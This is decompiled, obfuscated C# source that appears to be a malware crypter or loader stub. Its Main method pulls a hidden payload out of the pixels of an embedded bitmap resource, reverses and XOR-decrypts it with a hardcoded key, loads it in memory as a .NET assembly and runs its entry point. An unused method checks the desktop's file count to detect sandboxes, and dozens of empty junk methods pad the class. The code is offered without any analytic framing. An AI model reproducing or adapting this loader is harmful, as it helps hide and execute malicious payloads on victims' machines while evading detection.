using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

internal class Class5
{
	private static byte[] byte_0 = new byte[32]
	{
		93, 188, 198, 218, 250, 231, 239, 249, 86, 96,
		225, 65, 245, 98, 203, 26, 183, 141, 160, 241,
		96, 187, 128, 50, 167, 202, 146, 168, 186, 246,
		101, 168
	};

	private static void smethod_0()
	{
	}

	private static byte[] smethod_1(byte[] byte_1, byte[] byte_2)
	{
		for (int i = 0; i < byte_1.Length; i++)
		{
			for (int j = 0; j < byte_2.Length; j++)
			{
				byte_1[i] = (byte)(byte_1[i] ^ byte_2[j]);
			}
		}
		return byte_1;
	}

	private static void smethod_2()
	{
	}

	private static void smethod_3()
	{
	}

	private static void smethod_4()
	{
	}

	private static void smethod_5()
	{
	}

	private static void smethod_6()
	{
	}

	private static void smethod_7()
	{
	}

	private static void smethod_8()
	{
	}

	private static void smethod_9()
	{
	}

	private static void smethod_10()
	{
	}

	private static void smethod_11()
	{
	}

	private static void smethod_12()
	{
	}

	private static void smethod_13()
	{
	}

	private static void smethod_14()
	{
	}

	private static void smethod_15()
	{
	}

	private static void smethod_16()
	{
	}

	private static void smethod_17()
	{
	}

	private static void smethod_18()
	{
	}

	private static void smethod_19()
	{
	}

	private static void smethod_20()
	{
	}

	private static void smethod_21()
	{
	}

	private static void smethod_22()
	{
	}

	private static void smethod_23()
	{
	}

	private static void smethod_24()
	{
	}

	private static void smethod_25()
	{
	}

	private static void smethod_26()
	{
	}

	private static void smethod_27()
	{
	}

	private static void smethod_28()
	{
	}

	private static byte[] smethod_29(byte[] byte_1)
	{
		byte[] array = (byte[])Class5.smethod_57((Array)byte_1);
		for (int i = 0; i < byte_1.Length; i++)
		{
			byte_1[i] = array[array.Length - 1 - i];
		}
		return byte_1;
	}

	private static void smethod_30()
	{
	}

	private static void smethod_31()
	{
	}

	private static void smethod_32()
	{
	}

	private static void smethod_33()
	{
	}

	private static void smethod_34()
	{
	}

	private static byte[] smethod_35(Bitmap bitmap_0)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		BitmapData val = bitmap_0.LockBits(new Rectangle(0, 0, Class5.smethod_58((Image)(object)bitmap_0), Class5.smethod_59((Image)(object)bitmap_0)), (ImageLockMode)1, ((Image)bitmap_0).get_PixelFormat());
		byte[] array = new byte[4];
		((Image)bitmap_0).get_PixelFormat();
		Marshal.Copy(val.get_Scan0(), array, 0, 4);
		array = new byte[BitConverter.ToInt32(array, 0) - 4];
		Marshal.Copy(new IntPtr(val.get_Scan0().ToInt32() + 4), array, 0, array.Length);
		return array;
	}

	private static void smethod_36()
	{
		string string_ = Class5.smethod_60(Environment.SpecialFolder.Desktop);
		DirectoryInfo directoryInfo_ = Class5.smethod_61(string_);
		if (Class5.smethod_62(directoryInfo_).Length <= 5)
		{
			Class5.smethod_63(0);
		}
	}

	private static void smethod_37()
	{
	}

	private static void Main(string[] args)
	{
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Thread.Sleep(4);
			Bitmap bitmap_ = smethod_53("C0sBzWM50bia0Ic", "xr1YXoa7PYlLgwi");
			byte[] byte_ = smethod_35(bitmap_);
			byte_ = smethod_29(byte_);
			byte_ = smethod_1(byte_, byte_0);
			Assembly assembly = smethod_43(byte_);
			MethodInfo entryPoint = assembly.EntryPoint;
			Type type = entryPoint.GetType();
			object[] obj = new object[2]
			{
				null,
				new object[1] { args }
			};
			string[] obj2 = new string[2] { "obj", "parameters" };
			bool[] array = new bool[2];
			LateBinding.LateCall((object)entryPoint, type, "Invoke", obj, obj2, array);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private static void smethod_38()
	{
	}

	private static void smethod_39()
	{
	}

	private static void smethod_40()
	{
	}

	private static void smethod_41()
	{
	}

	private static void smethod_42()
	{
	}

	private static Assembly smethod_43(byte[] byte_1)
	{
		return (Assembly)smethod_47(byte_1);
	}

	private static void smethod_44()
	{
	}

	private static void smethod_45()
	{
	}

	private static void smethod_46()
	{
	}

	private static object smethod_47(object object_0)
	{
		return Class5.smethod_65(Class5.smethod_64(), (byte[])object_0);
	}

	private static void smethod_48()
	{
	}

	private static void smethod_49()
	{
	}

	private static void smethod_50()
	{
	}

	private static void smethod_51()
	{
	}

	private static void smethod_52()
	{
	}

	private static Bitmap smethod_53(string string_0, string string_1)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		ResourceManager resourceManager_ = Class5.smethod_68(string_0, Class5.smethod_67(Class5.smethod_66(typeof(Class5).TypeHandle)));
		return (Bitmap)Class5.smethod_69(resourceManager_, string_1);
	}

	private static void smethod_54()
	{
	}

	private static void smethod_55()
	{
	}

	private static void smethod_56()
	{
	}

	static object smethod_57(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_58(Image image_0)
	{
		return image_0.get_Width();
	}

	static int smethod_59(Image image_0)
	{
		return image_0.get_Height();
	}

	static string smethod_60(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static DirectoryInfo smethod_61(string string_0)
	{
		return new DirectoryInfo(string_0);
	}

	static FileInfo[] smethod_62(DirectoryInfo directoryInfo_0)
	{
		return directoryInfo_0.GetFiles();
	}

	static void smethod_63(int int_0)
	{
		Environment.Exit(int_0);
	}

	static AppDomain smethod_64()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_65(AppDomain appDomain_0, byte[] byte_1)
	{
		return appDomain_0.Load(byte_1);
	}

	static Type smethod_66(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static Assembly smethod_67(Type type_0)
	{
		return type_0.Assembly;
	}

	static ResourceManager smethod_68(string string_0, Assembly assembly_0)
	{
		return new ResourceManager(string_0, assembly_0);
	}

	static object smethod_69(ResourceManager resourceManager_0, string string_0)
	{
		return resourceManager_0.GetObject(string_0);
	}
}
